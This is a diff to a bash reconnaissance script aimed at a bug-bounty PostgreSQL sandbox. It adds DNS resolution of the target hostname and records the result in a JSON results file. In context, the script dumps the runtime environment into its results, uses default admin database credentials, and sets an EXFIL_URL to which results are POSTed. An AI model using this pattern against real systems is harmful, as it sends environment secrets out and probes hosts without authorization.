@@ -9,20 +9,30 @@ set -euo pipefail
 # SCOPE: single target only — sandbox FQDN/IP. No internal ranges, no
 # other *.aivencloud.com, no metadata probing (169.254.169.254 = operator-gated).
 TARGET="${TARGET_IP:-132.145.191.135}"
+TARGET_FQDN="falcon-bug-bounty-flag-pgsql-dev-sandbox.aivencloud.com"
 EXFIL_URL="${EXFIL_URL:-}"          # set via Runtime env; curl POST results here
 RESULTS_DIR="/results"
 RESULTS_FILE="${RESULTS_DIR}/probe-$(date -u +%Y%m%dT%H%M%SZ).json"
 LOG_FILE="${RESULTS_DIR}/probe-$(date -u +%Y%m%dT%H%M%SZ).log"
 HTTP_PORT=8080
 
+mkdir -p "$RESULTS_DIR"
+
+log() { echo "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }
+
+# --- runtime DNS record (FQDN may be NXDOMAIN / rotating; capture both) ---
+RESOLVED_IP=""
+if command -v dig >/dev/null 2>&1; then
+    RESOLVED_IP=$(dig +short "$TARGET_FQDN" A 2>/dev/null | head -1 || true)
+elif command -v getent >/dev/null 2>&1; then
+    RESOLVED_IP=$(getent ahosts "$TARGET_FQDN" 2>/dev/null | awk 'NR==1{print $1}')
+fi
+log "Target FQDN: $TARGET_FQDN -> resolved: ${RESOLVED_IP:-NXDOMAIN} (pinned IP: $TARGET)"
+
 # PG defaults for Aiven-style instances
 PG_USER="${PG_USER:-avnadmin}"
 PG_PASS="${PG_PASS:-}"              # from Runtime env or set manually
 PG_DB="${PG_DB:-defaultdb}"
-
-mkdir -p "$RESULTS_DIR"
-
-log() { echo "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }
 
 # =============================================================================
 # PHASE 0: Runtime environment intel
@@ -288,6 +298,8 @@ cat > "$RESULTS_FILE" << ENDJSON
 {
   "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
   "target": "$TARGET",
+  "target_fqdn": "$TARGET_FQDN",
+  "resolved_ip": "${RESOLVED_IP:-NXDOMAIN}",
   "outbound_ip": "$OUTBOUND_IP",
   "env_intel": $(echo "$ENV_DUMP" | jq -R -s 'split("\n") | map(select(. != ""))'),
   "sweep": {
